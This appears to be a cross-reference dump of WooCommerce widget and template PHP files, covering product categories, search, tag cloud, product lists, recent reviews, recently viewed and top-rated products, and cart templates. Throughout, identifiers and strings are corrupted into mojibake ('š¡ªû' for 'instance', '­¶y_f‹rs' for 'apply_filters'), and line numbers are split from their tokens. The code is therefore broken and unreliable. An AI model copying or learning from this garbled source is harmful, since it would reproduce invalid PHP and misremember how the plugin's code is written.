$š¡ªû
 ) {

76 
	`exŒaù
Ğ
$¬gs
 );

78 
glob®
 
$wp_qu”y
, 
$po¡
, 
$woocomm”û
;

80 
$t™Ë
 = 
	`­¶y_f‹rs
Ğ'widg‘_t™Ë', 
$š¡ªû
['t™Ë'], $š¡ªû, 
$this
->
id_ba£
 );

81 
$c
 = ! 
	`em±y
Ğ
$š¡ªû
['count'] );

82 
$h
 = ! 
	`em±y
Ğ
$š¡ªû
['hierarchical'] );

83 
$s
 = ! 
	`em±y
Ğ
$š¡ªû
['show_children_only'] );

84 
$d
 = ! 
	`em±y
Ğ
$š¡ªû
['dropdown'] );

85 
$o
 = 
$š¡ªû
['orderby'] ? $instance['orderby'] : 'order';

86 
$drİdown_¬gs
 = 
	`¬¿y
Ğ'hide_em±y' => 
çl£
 );

87 
$li¡_¬gs
 = 
	`¬¿y
Ğ'show_couÁ' => 
$c
, 'h›¿rchiÿl' => 
$h
, 'xÚomy' => '´oduù_ÿt', 'hide_em±y' => 
çl£
 );

90 
$li¡_¬gs
['m’u_Üd”'] = 
çl£
;

91 iàĞ
$o
 == 'order' ) {

92 
$li¡_¬gs
['menu_order'] = 'asc';

94 
$li¡_¬gs
['orderby'] = 'title';

98 
$this
->
cu¼’t_ÿt
 = 
çl£
;

99 
$this
->
ÿt_ªû¡Üs
 = 
	`¬¿y
();

101 iàĞ
	`is_x
('product_cat') ) {

103 
$this
->
cu¼’t_ÿt
 = 
$wp_qu”y
->
qu”›d_objeù
;

104 
$this
->
ÿt_ªû¡Üs
 = 
	`g‘_ªû¡Üs
Ğ$this->
cu¼’t_ÿt
->
‹rm_id
, 'product_cat' );

106 } 
	`–£if
 ( 
	`is_sšguÏr
('product') ) {

108 
$´oduù_ÿ‹gÜy
 = 
	`wc_g‘_´oduù_‹rms
Ğ
$po¡
->
ID
, '´oduù_ÿt', 
	`¬¿y
( 'orderby' => 'parent' ) );

110 iàĞ
$´oduù_ÿ‹gÜy
 ) {

111 
$this
->
cu¼’t_ÿt
 = 
	`’d
Ğ
$´oduù_ÿ‹gÜy
 );

112 
$this
->
ÿt_ªû¡Üs
 = 
	`g‘_ªû¡Üs
Ğ$this->
cu¼’t_ÿt
->
‹rm_id
, 'product_cat' );

118 iàĞ
$s
 && 
$this
->
cu¼’t_ÿt
 ) {

121 
$tİ_Ëv–
 = 
	`g‘_‹rms
(

123 
	`¬¿y
(

126 'h›¿rchiÿl' => 
Œue
,

127 'hide_em±y' => 
çl£


132 
$dœeù_chd»n
 = 
	`g‘_‹rms
(

134 
	`¬¿y
(

136 '·»Á' => 
$this
->
cu¼’t_ÿt
->
‹rm_id
,

137 'h›¿rchiÿl' => 
Œue
,

138 'hide_em±y' => 
çl£


143 
$siblšgs
 = 
	`¬¿y
();

144 iàĞ
$this
->
ÿt_ªû¡Üs
 ) {

145 
	`fÜ—ch
 ( 
$this
->
ÿt_ªû¡Üs
 
as
 
$ªû¡Ü
 ) {

146 
$ªû¡Ü_siblšgs
 = 
	`g‘_‹rms
(

148 
	`¬¿y
(

150 '·»Á' => 
$ªû¡Ü
,

151 'h›¿rchiÿl' => 
çl£
,

152 'hide_em±y' => 
çl£


155 
$siblšgs
 = 
	`¬¿y_m”ge
Ğ$siblšgs, 
$ªû¡Ü_siblšgs
 );

159 iàĞ
$h
 ) {

160 
$šşude
 = 
	`¬¿y_m”ge
Ğ
$tİ_Ëv–
, 
$this
->
ÿt_ªû¡Üs
, 
$siblšgs
, 
$dœeù_chd»n
, 
	`¬¿y
Ğ$this->
cu¼’t_ÿt
->
‹rm_id
 ) );

162 
$šşude
 = 
	`¬¿y_m”ge
Ğ
$dœeù_chd»n
 );

165 
$drİdown_¬gs
['šşude'] = 
	`im¶ode
Ğ',', 
$šşude
 );

166 
$li¡_¬gs
['šşude'] = 
	`im¶ode
Ğ',', 
$šşude
 );

168 iàĞ
	`em±y
Ğ
$šşude
 ) ) {

172 } 
	`–£if
 ( 
$s
 ) {

173 
$drİdown_¬gs
['depth'] = 1;

174 
$drİdown_¬gs
['child_of'] = 0;

175 
$drİdown_¬gs
['hierarchical'] = 1;

176 
$li¡_¬gs
['depth'] = 1;

177 
$li¡_¬gs
['child_of'] = 0;

178 
$li¡_¬gs
['hierarchical'] = 1;

181 
echo
 
$befÜe_widg‘
;

183 iàĞ
$t™Ë
 ) {

184 
echo
 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

188 iàĞ
$d
 ) {

190 
$drİdown_deçuÉs
 = 
	`¬¿y
(

191 'show_couÁs' => 
$c
,

192 'h›¿rchiÿl' => 
$h
,

194 'Üd”by' => 
$o
,

195 '£Ëùed' => 
$this
->
cu¼’t_ÿt
 ? $this->cu¼’t_ÿt->
¦ug
 : ''

197 
$drİdown_¬gs
 = 
	`wp_·r£_¬gs
Ğ$drİdown_¬gs, 
$drİdown_deçuÉs
 );

200 
	`wc_´oduù_drİdown_ÿ‹gÜ›s
Ğ
$drİdown_¬gs
 );

202 <
süt
 
ty³
='text/javascript'>

204 
v¬
 
´oduù_ÿt_drİdown
 = 
docum’t
.
	`g‘EËm’tById
("dropdown_product_cat");

205 
funùiÚ
 
	`ÚProduùC©Chªge
() {

206 iàĞ
´oduù_ÿt_drİdown
.
İtiÚs
[´oduù_ÿt_drİdown.
£ËùedIndex
].
v®ue
 !=='' ) {

207 
loÿtiÚ
.
h»f
 = "<?ph°echØhome_u¾(); ?>/?´oduù_ÿt="+
´oduù_ÿt_drİdown
.
İtiÚs
[´oduù_ÿt_drİdown.
£ËùedIndex
].
v®ue
;

210 
´oduù_ÿt_drİdown
.
Úchªge
 = 
ÚProduùC©Chªge
;

212 </
süt
>

213 <?
php


218 
	`šşude_Úû
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/walkers/class-product-cat-list-walker.php' );

220 
$li¡_¬gs
['w®k”'] = 
Ãw
 
WC_Produù_C©_Li¡_W®k”
;

221 
$li¡_¬gs
['title_li'] = '';

222 
$li¡_¬gs
['pad_counts'] = 1;

223 
$li¡_¬gs
['show_İtiÚ_nÚe'] = 
	`__
('No…roduct categoriesƒxist.', 'woocommerce' );

224 
$li¡_¬gs
['cu¼’t_ÿ‹gÜy'] = ( 
$this
->
cu¼’t_ÿt
 ) ? $this->cu¼’t_ÿt->
‹rm_id
 : '';

225 
$li¡_¬gs
['cu¼’t_ÿ‹gÜy_ªû¡Üs'] = 
$this
->
ÿt_ªû¡Üs
;

227 
echo
 '<ul class="product-categories">';

229 
	`wp_li¡_ÿ‹gÜ›s
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_ÿ‹gÜ›s_widg‘_¬gs', 
$li¡_¬gs
 ) );

231 
echo
 '</ul>';

234 
echo
 
$aá”_widg‘
;

235 
	}
}

238 
»gi¡”_widg‘
( 'WC_Widget_Product_Categories' );

	@includes/widgets/class-wc-widget-product-search.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Widg‘_Produù_S—rch
 
ex‹nds
 
	mWC_Widg‘
 {

19 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

20 
$this
->
widg‘_cssşass
 = 'woocommerce widget_product_search';

21 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'A Search box for…roducts only.', 'woocommerce' );

22 
$this
->
widg‘_id
 = 'woocommerce_product_search';

23 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Product Search', 'woocommerce' );

24 
$this
->
£‰šgs
 = 
	`¬¿y
(

25 't™Ë' => 
	`¬¿y
(

27 '¡d' => 
	`__
( 'Search Products', 'woocommerce' ),

28 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

31 
·»Á
::
	`__cÚ¡ruù
();

43 
funùiÚ
 
	$widg‘
Ğ
$¬gs
, 
$š¡ªû
 ) {

44 
	`exŒaù
Ğ
$¬gs
 );

46 
$t™Ë
 = 
$š¡ªû
['title'];

47 
$t™Ë
 = 
	`­¶y_f‹rs
('widg‘_t™Ë', $t™Ë, 
$š¡ªû
, 
$this
->
id_ba£
);

49 
echo
 
$befÜe_widg‘
;

51 iàĞ
$t™Ë
 )

52 
echo
 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

54 
	`g‘_´oduù_£¬ch_fÜm
();

56 
echo
 
$aá”_widg‘
;

57 
	}
}

60 
»gi¡”_widg‘
( 'WC_Widget_Product_Search' );

	@includes/widgets/class-wc-widget-product-tag-cloud.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Widg‘_Produù_Tag_Cloud
 
ex‹nds
 
	mWC_Widg‘
 {

19 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

20 
$this
->
widg‘_cssşass
 = 'woocommerce widget_product_tag_cloud';

21 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'Your most used…roductags in cloud format.', 'woocommerce' );

22 
$this
->
widg‘_id
 = 'woocommerce_product_tag_cloud';

23 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Product Tags', 'woocommerce' );

24 
$this
->
£‰šgs
 = 
	`¬¿y
(

25 't™Ë' => 
	`¬¿y
(

27 '¡d' => 
	`__
( 'Product Tags', 'woocommerce' ),

28 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

31 
·»Á
::
	`__cÚ¡ruù
();

43 
public
 
funùiÚ
 
	$widg‘
Ğ
$¬gs
, 
$š¡ªû
 ) {

44 
	`exŒaù
Ğ
$¬gs
 );

46 
$cu¼’t_xÚomy
 = 
$this
->
	`_g‘_cu¼’t_xÚomy
(
$š¡ªû
);

48 iàĞ
	`em±y
Ğ
$š¡ªû
['title'] ) ) {

49 
$x
 = 
	`g‘_xÚomy
Ğ
$cu¼’t_xÚomy
 );

50 
$t™Ë
 = 
	`­¶y_f‹rs
Ğ'widg‘_t™Ë', 
$x
->
Ïb–s
->
Çme
, 
$š¡ªû
, 
$this
->
id_ba£
 );

52 
$t™Ë
 = 
	`­¶y_f‹rs
Ğ'widg‘_t™Ë', 
$š¡ªû
['t™Ë'], $š¡ªû, 
$this
->
id_ba£
 );

55 
echo
 
$befÜe_widg‘
;

57 iàĞ
$t™Ë
 )

58 
echo
 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

60 
echo
 '<div class="tagcloud">';

62 
	`wp_g_şoud
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_g_şoud_widg‘_¬gs', 
	`¬¿y
Ğ'xÚomy' => 
$cu¼’t_xÚomy
 ) ) );

64 
echo
 "</div>";

66 
echo
 
$aá”_widg‘
;

67 
	}
}

75 
public
 
funùiÚ
 
	$_g‘_cu¼’t_xÚomy
Ğ
$š¡ªû
 ) {

77 
	}
}

80 
»gi¡”_widg‘
( 'WC_Widget_Product_Tag_Cloud' );

	@includes/widgets/class-wc-widget-products.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Widg‘_Produùs
 
ex‹nds
 
	mWC_Widg‘
 {

19 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

20 
$this
->
widg‘_cssşass
 = 'woocommerce widget_products';

21 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'Display‡†ist of your…roducts on your site.', 'woocommerce' );

22 
$this
->
widg‘_id
 = 'woocommerce_products';

23 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Products', 'woocommerce' );

24 
$this
->
£‰šgs
 = 
	`¬¿y
(

25 't™Ë' => 
	`¬¿y
(

27 '¡d' => 
	`__
( 'Products', 'woocommerce' ),

28 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

30 'numb”' => 
	`¬¿y
(

36 'Ïb–' => 
	`__
( 'Number of…roductso show', 'woocommerce' )

38 'show' => 
	`¬¿y
(

41 'Ïb–' => 
	`__
( 'Show', 'woocommerce' ),

42 'İtiÚs' => 
	`¬¿y
(

43 '' => 
	`__
( 'All Products', 'woocommerce' ),

44 'ã©u»d' => 
	`__
( 'Featured Products', 'woocommerce' ),

45 'Ú§Ë' => 
	`__
( 'On-sale Products', 'woocommerce' ),

48 'Üd”by' => 
	`¬¿y
(

51 'Ïb–' => 
	`__
( 'Order by', 'woocommerce' ),

52 'İtiÚs' => 
	`¬¿y
(

53 'd©e' => 
	`__
( 'Date', 'woocommerce' ),

54 '´iû' => 
	`__
( 'Price', 'woocommerce' ),

55 '¿nd' => 
	`__
( 'Random', 'woocommerce' ),

56 '§Ës' => 
	`__
( 'Sales', 'woocommerce' ),

59 'Üd”' => 
	`¬¿y
(

62 'Ïb–' => 
	`_x
( 'Order', 'Sorting order', 'woocommerce' ),

63 'İtiÚs' => 
	`¬¿y
(

64 'asc' => 
	`__
( 'ASC', 'woocommerce' ),

65 'desc' => 
	`__
( 'DESC', 'woocommerce' ),

68 'hide_ä“' => 
	`¬¿y
(

71 'Ïb–' => 
	`__
( 'Hide free…roducts', 'woocommerce' )

73 'show_hidd’' => 
	`¬¿y
(

76 'Ïb–' => 
	`__
( 'Show hidden…roducts', 'woocommerce' )

79 
·»Á
::
	`__cÚ¡ruù
();

91 
public
 
funùiÚ
 
	$widg‘
Ğ
$¬gs
, 
$š¡ªû
 ) {

93 iàĞ
$this
->
	`g‘_ÿched_widg‘
Ğ
$¬gs
 ) )

96 
	`ob_¡¬t
();

97 
	`exŒaù
Ğ
$¬gs
 );

99 
$t™Ë
 = 
	`­¶y_f‹rs
Ğ'widg‘_t™Ë', 
$š¡ªû
['t™Ë'], $š¡ªû, 
$this
->
id_ba£
 );

100 
$numb”
 = 
	`absšt
Ğ
$š¡ªû
['number'] );

101 
$show
 = 
	`§n™ize_t™Ë
Ğ
$š¡ªû
['show'] );

102 
$Üd”by
 = 
	`§n™ize_t™Ë
Ğ
$š¡ªû
['orderby'] );

103 
$Üd”
 = 
	`§n™ize_t™Ë
Ğ
$š¡ªû
['order'] );

104 
$show_¿tšg
 = 
çl£
;

106 
$qu”y_¬gs
 = 
	`¬¿y
(

107 'po¡s_³r_·ge' => 
$numb”
,

111 'Üd”' => 
$Üd”
 == 'asc' ? 'asc' : 'desc'

114 
$qu”y_¬gs
['m‘a_qu”y'] = 
	`¬¿y
();

116 iàĞ
	`em±y
Ğ
$š¡ªû
['show_hidden'] ) ) {

117 
$qu”y_¬gs
['m‘a_qu”y'][] = 
	`WC
()->
qu”y
->
	`visib™y_m‘a_qu”y
();

118 
$qu”y_¬gs
['post_parent'] = 0;

121 iàĞ! 
	`em±y
Ğ
$š¡ªû
['hide_free'] ) ) {

122 
$qu”y_¬gs
['m‘a_qu”y'][] = 
	`¬¿y
(

130 
$qu”y_¬gs
['m‘a_qu”y'][] = 
	`WC
()->
qu”y
->
	`¡ock_¡©us_m‘a_qu”y
();

131 
$qu”y_¬gs
['m‘a_qu”y'] = 
	`¬¿y_f‹r
( $query_args['meta_query'] );

133  
$show
 ) {

135 
$qu”y_¬gs
['m‘a_qu”y'][] = 
	`¬¿y
(

141 
$´oduù_ids_Ú_§Ë
 = 
	`wc_g‘_´oduù_ids_Ú_§Ë
();

142 
$´oduù_ids_Ú_§Ë
[] = 0;

143 
$qu”y_¬gs
['po¡__š'] = 
$´oduù_ids_Ú_§Ë
;

147  
$Üd”by
 ) {

149 
$qu”y_¬gs
['meta_key'] = '_price';

150 
$qu”y_¬gs
['orderby'] = 'meta_value_num';

153 
$qu”y_¬gs
['orderby'] = 'rand';

156 
$qu”y_¬gs
['meta_key'] = 'total_sales';

157 
$qu”y_¬gs
['orderby'] = 'meta_value_num';

160 
$qu”y_¬gs
['orderby'] = 'date';

163 
$r
 = 
Ãw
 
	`WP_Qu”y
Ğ
$qu”y_¬gs
 );

165 iàĞ
$r
->
	`have_po¡s
() ) {

167 
echo
 
$befÜe_widg‘
;

169 iàĞ
$t™Ë
 )

170 
echo
 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

172 
echo
 '<ul class="product_list_widget">';

174  
$r
->
	`have_po¡s
()) {

175 
$r
->
	`the_po¡
();

176 
	`wc_g‘_‹m¶©e
Ğ'cÚ‹Á-widg‘-´oduù.php', 
	`¬¿y
Ğ'show_¿tšg' => 
$show_¿tšg
 ) );

179 
echo
 '</ul>';

181 
echo
 
$aá”_widg‘
;

184 
	`wp_»£t_po¡d©a
();

186 
$cÚ‹Á
 = 
	`ob_g‘_ş—n
();

188 
echo
 
$cÚ‹Á
;

190 
$this
->
	`ÿche_widg‘
Ğ
$¬gs
, 
$cÚ‹Á
 );

191 
	}
}

194 
»gi¡”_widg‘
( 'WC_Widget_Products' );

	@includes/widgets/class-wc-widget-recent-reviews.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Widg‘_ReûÁ_Rev›ws
 
ex‹nds
 
	mWC_Widg‘
 {

19 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

20 
$this
->
widg‘_cssşass
 = 'woocommerce widget_recent_reviews';

21 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'Display‡†ist of your most„ecent„eviews on your site.', 'woocommerce' );

22 
$this
->
widg‘_id
 = 'woocommerce_recent_reviews';

23 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Recent Reviews', 'woocommerce' );

24 
$this
->
£‰šgs
 = 
	`¬¿y
(

25 't™Ë' => 
	`¬¿y
(

27 '¡d' => 
	`__
( 'Recent Reviews', 'woocommerce' ),

28 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

30 'numb”' => 
	`¬¿y
(

36 'Ïb–' => 
	`__
( 'Number of„eviewso show', 'woocommerce' )

39 
·»Á
::
	`__cÚ¡ruù
();

51 
public
 
funùiÚ
 
	$widg‘
Ğ
$¬gs
, 
$š¡ªû
 ) {

52 
glob®
 
$comm’ts
, 
$comm’t
, 
$woocomm”û
;

54 iàĞ
$this
->
	`g‘_ÿched_widg‘
Ğ
$¬gs
 ) )

57 
	`ob_¡¬t
();

58 
	`exŒaù
Ğ
$¬gs
 );

60 
$t™Ë
 = 
	`­¶y_f‹rs
Ğ'widg‘_t™Ë', 
$š¡ªû
['t™Ë'], $š¡ªû, 
$this
->
id_ba£
 );

61 
$numb”
 = 
	`absšt
Ğ
$š¡ªû
['number'] );

62 
$comm’ts
 = 
	`g‘_comm’ts
Ğ
	`¬¿y
Ğ'numb”' => 
$numb”
, 'status' => 'approve', 'post_status' => 'publish', 'post_type' => 'product' ) );

64 iàĞ
$comm’ts
 ) {

65 
echo
 
$befÜe_widg‘
;

66 iàĞ
$t™Ë
 ) 
echo
 
$befÜe_t™Ë
 . $t™Ë . 
$aá”_t™Ë
;

67 
echo
 '<ul class="product_list_widget">';

69 
	`fÜ—ch
 ( (
¬¿y
è
$comm’ts
 
as
 
$comm’t
 ) {

71 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$comm’t
->
comm’t_po¡_ID
 );

73 
$¿tšg
 = 
	`štv®
Ğ
	`g‘_comm’t_m‘a
Ğ
$comm’t
->
comm’t_ID
, '¿tšg', 
Œue
 ) );

75 
$¿tšg_html
 = 
$_´oduù
->
	`g‘_¿tšg_html
Ğ
$¿tšg
 );

77 
echo
 '<li><¨h»f="' . 
	`esc_u¾
Ğ
	`g‘_comm’t_lšk
Ğ
$comm’t
->
comm’t_ID
 ) ) . '">';

79 
echo
 
$_´oduù
->
	`g‘_image
();

81 
echo
 
$_´oduù
->
	`g‘_t™Ë
().'</a>';

83 
echo
 
$¿tšg_html
;

85 
	`´štf
Ğ'<¥ª cÏss="»v›w”">' . 
	`_x
Ğ'by %1$s', 'by comm’ˆauthÜ', 'woocomm”û' ) . '</¥ª>', 
	`g‘_comm’t_authÜ
() );

87 
echo
 '</li>';

90 
echo
 '</ul>';

91 
echo
 
$aá”_widg‘
;

94 
$cÚ‹Á
 = 
	`ob_g‘_ş—n
();

96 
echo
 
$cÚ‹Á
;

98 
$this
->
	`ÿche_widg‘
Ğ
$¬gs
, 
$cÚ‹Á
 );

99 
	}
}

102 
»gi¡”_widg‘
( 'WC_Widget_Recent_Reviews' );

	@includes/widgets/class-wc-widget-recently-viewed.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Widg‘_ReûÁly_V›wed
 
ex‹nds
 
	mWC_Widg‘
 {

19 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

20 
$this
->
widg‘_cssşass
 = 'woocommerce widget_recently_viewed_products';

21 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'Display‡†ist of„ecently viewed…roducts.', 'woocommerce' );

22 
$this
->
widg‘_id
 = 'woocommerce_recently_viewed_products';

23 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Recently Viewed', 'woocommerce' );

24 
$this
->
£‰šgs
 = 
	`¬¿y
(

25 't™Ë' => 
	`¬¿y
(

27 '¡d' => 
	`__
( 'Recently Viewed Products', 'woocommerce' ),

28 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

30 'numb”' => 
	`¬¿y
(

36 'Ïb–' => 
	`__
( 'Number of…roductso show', 'woocommerce' )

39 
·»Á
::
	`__cÚ¡ruù
();

51 
funùiÚ
 
	$widg‘
(
$¬gs
, 
$š¡ªû
) {

53 
$v›wed_´oduùs
 = ! 
	`em±y
Ğ
$_COOKIE
['woocomm”û_»ûÁly_v›wed'] ) ? (
¬¿y
è
	`ex¶ode
Ğ'|', $_COOKIE['woocomm”û_»ûÁly_v›wed'] ) : 
	`¬¿y
();

54 
$v›wed_´oduùs
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
( 'absint', $viewed_products ) );

56 iàĞ
	`em±y
Ğ
$v›wed_´oduùs
 ) )

59 
	`ob_¡¬t
();

60 
	`exŒaù
Ğ
$¬gs
 );

62 
$t™Ë
 = 
	`­¶y_f‹rs
Ğ'widg‘_t™Ë', 
$š¡ªû
['t™Ë'], $š¡ªû, 
$this
->
id_ba£
 );

63 
$numb”
 = 
	`absšt
Ğ
$š¡ªû
['number'] );

65 
$qu”y_¬gs
 = 
	`¬¿y
Ğ'po¡s_³r_·ge' => 
$numb”
, 'no_found_rows' => 1, 'po¡_¡©us' => 'publish', 'po¡_ty³' => '´oduù', 'po¡__š' => 
$v›wed_´oduùs
, 'orderby' => 'rand' );

67 
$qu”y_¬gs
['m‘a_qu”y'] = 
	`¬¿y
();

68 
$qu”y_¬gs
['m‘a_qu”y'][] = 
	`WC
()->
qu”y
->
	`¡ock_¡©us_m‘a_qu”y
();

69 
$qu”y_¬gs
['m‘a_qu”y'] = 
	`¬¿y_f‹r
( $query_args['meta_query'] );

71 
$r
 = 
Ãw
 
	`WP_Qu”y
(
$qu”y_¬gs
);

73 iàĞ
$r
->
	`have_po¡s
() ) {

75 
echo
 
$befÜe_widg‘
;

77 iàĞ
$t™Ë
 )

78 
echo
 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

80 
echo
 '<ul class="product_list_widget">';

82  
$r
->
	`have_po¡s
()) {

83 
$r
->
	`the_po¡
();

84 
	`wc_g‘_‹m¶©e
( 'content-widget-product.php' );

87 
echo
 '</ul>';

89 
echo
 
$aá”_widg‘
;

92 
	`wp_»£t_po¡d©a
();

94 
$cÚ‹Á
 = 
	`ob_g‘_ş—n
();

96 
echo
 
$cÚ‹Á
;

97 
	}
}

100 
»gi¡”_widg‘
( 'WC_Widget_Recently_Viewed' );

	@includes/widgets/class-wc-widget-top-rated-products.php

1 <?
php


14 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Widg‘_Tİ_R©ed_Produùs
 
ex‹nds
 
	mWC_Widg‘
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

22 
$this
->
widg‘_cssşass
 = 'woocommerce widget_top_rated_products';

23 
$this
->
widg‘_desütiÚ
 = 
	`__
( 'Display‡†ist of yourop„ated…roducts on your site.', 'woocommerce' );

24 
$this
->
widg‘_id
 = 'woocommerce_top_rated_products';

25 
$this
->
widg‘_Çme
 = 
	`__
( 'WooCommerce Top Rated Products', 'woocommerce' );

26 
$this
->
£‰šgs
 = 
	`¬¿y
(

27 't™Ë' => 
	`¬¿y
(

29 '¡d' => 
	`__
( 'Top Rated Products', 'woocommerce' ),

30 'Ïb–' => 
	`__
( 'Title', 'woocommerce' )

32 'numb”' => 
	`¬¿y
(

38 'Ïb–' => 
	`__
( 'Number of…roductso show', 'woocommerce' )

41 
·»Á
::
	`__cÚ¡ruù
();

53 
public
 
funùiÚ
 
	$widg‘
(
$¬gs
, 
$š¡ªû
) {

55 iàĞ
$this
->
	`g‘_ÿched_widg‘
Ğ
$¬gs
 ) )

58 
	`ob_¡¬t
();

59 
	`exŒaù
Ğ
$¬gs
 );

61 
$t™Ë
 = 
	`­¶y_f‹rs
Ğ'widg‘_t™Ë', 
$š¡ªû
['t™Ë'], $š¡ªû, 
$this
->
id_ba£
 );

62 
$numb”
 = 
	`absšt
Ğ
$š¡ªû
['number'] );

64 
	`add_f‹r
Ğ'po¡s_şau£s', 
	`¬¿y
Ğ
	`WC
()->
qu”y
, 'order_by_rating_post_clauses' ) );

66 
$qu”y_¬gs
 = 
	`¬¿y
('po¡s_³r_·ge' => 
$numb”
, 'no_found_rows' => 1, 'post_status' => 'publish', 'post_type' => 'product' );

68 
$qu”y_¬gs
['m‘a_qu”y'] = 
	`WC
()->
qu”y
->
	`g‘_m‘a_qu”y
();

70 
$r
 = 
Ãw
 
	`WP_Qu”y
Ğ
$qu”y_¬gs
 );

72 iàĞ
$r
->
	`have_po¡s
() ) {

74 
echo
 
$befÜe_widg‘
;

76 iàĞ
$t™Ë
 )

77 
echo
 
$befÜe_t™Ë
 . 
$t™Ë
 . 
$aá”_t™Ë
;

79 
echo
 '<ul class="product_list_widget">';

81  
$r
->
	`have_po¡s
() ) {

82 
$r
->
	`the_po¡
();

83 
	`wc_g‘_‹m¶©e
Ğ'cÚ‹Á-widg‘-´oduù.php', 
	`¬¿y
Ğ'show_¿tšg' => 
Œue
 ) );

86 
echo
 '</ul>';

88 
echo
 
$aá”_widg‘
;

91 
	`»move_f‹r
Ğ'po¡s_şau£s', 
	`¬¿y
Ğ
	`WC
()->
qu”y
, 'order_by_rating_post_clauses' ) );

93 
	`wp_»£t_po¡d©a
();

95 
$cÚ‹Á
 = 
	`ob_g‘_ş—n
();

97 
echo
 
$cÚ‹Á
;

99 
$this
->
	`ÿche_widg‘
Ğ
$¬gs
, 
$cÚ‹Á
 );

100 
	}
}

103 
»gi¡”_widg‘
( 'WC_Widget_Top_Rated_Products' );

	@templates/archive-product.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 
g‘_h—d”
( 'shop' ); ?>

16 <?
php


23 
do_aùiÚ
( 'woocommerce_before_main_content' );

26 <?
php
 iàĞ
­¶y_f‹rs
Ğ'woocomm”û_show_·ge_t™Ë', 
Œue
 ) ) : ?>

28 <
h1
 
şass
="·ge-t™Ë"><?
php
 
woocomm”û_·ge_t™Ë
(); ?></
	gh1
>

30 <?
php
 
	g’dif
; ?>

32 <?
php
 
do_aùiÚ
( 'woocommerce_archive_description' ); ?>

34 <?
php
 iàĞ
	$have_po¡s
() ) : ?>

36 <?
php


43 
	`do_aùiÚ
( 'woocommerce_before_shop_loop' );

46 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

48 <?
php
 
	`woocomm”û_´oduù_subÿ‹gÜ›s
(); ?>

50 <?
php
  
	$have_po¡s
(èè: 
	`the_po¡
(); ?>

52 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

54 <?
php
 
’dwhe
;

56 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

58 <?
php


64 
	`do_aùiÚ
( 'woocommerce_after_shop_loop' );

67 <?
php
 
	`–£if
 ( ! 
	`woocomm”û_´oduù_subÿ‹gÜ›s
Ğ
	`¬¿y
Ğ'befÜe' => 
	`woocomm”û_´oduù_loİ_¡¬t
Ğ
çl£
 ), 'aá”' => 
	$woocomm”û_´oduù_loİ_’d
Ğ
çl£
 ) ) ) ) : ?>

69 <?
php
 
	`wc_g‘_‹m¶©e
( 'loop/no-products-found.php' ); ?>

71 <?
php
 
’dif
; ?>

73 <?
php


79 
	`do_aùiÚ
( 'woocommerce_after_main_content' );

82 <?
php


88 
	`do_aùiÚ
( 'woocommerce_sidebar' );

91 <?
php
 
	`g‘_foÙ”
( 'shop' ); ?>

	@templates/cart/cart-empty.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
wc_´št_nÙiûs
();

16 <
p
 
	gşass
="ÿ¹-em±y"><?
php
 
_e
Ğ'You¸ÿ¹ i cu¼’yƒm±y.', 'woocomm”û' ) ?></
	gp
>

18 <?
php
 
do_aùiÚ
( 'woocommerce_cart_is_empty' ); ?>

20 <
p
 
	gşass
="»tuº-to-shİ"><
a
 
şass
="bu‰Ú wc-backw¬d" 
h»f
="<?ph°echØ­¶y_f‹rsĞ'woocomm”û_»tuº_to_shİ_»dœeù', g‘_³rm®škĞwc_g‘_·ge_idĞ'shİ' ) ) ); ?>"><?
php
 
_e
Ğ'R‘uº TØShİ', 'woocomm”û' ) ?></
	ga
></
	gp
>

	@templates/cart/cart-item-data.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 <
dl
 
	gşass
="variation">

14 <?
php


15 
	$fÜ—ch
 ( 
$™em_d©a
 
as
 
$d©a
 ) :

16 
$key
 = 
	`§n™ize_‹xt_f›ld
Ğ
$d©a
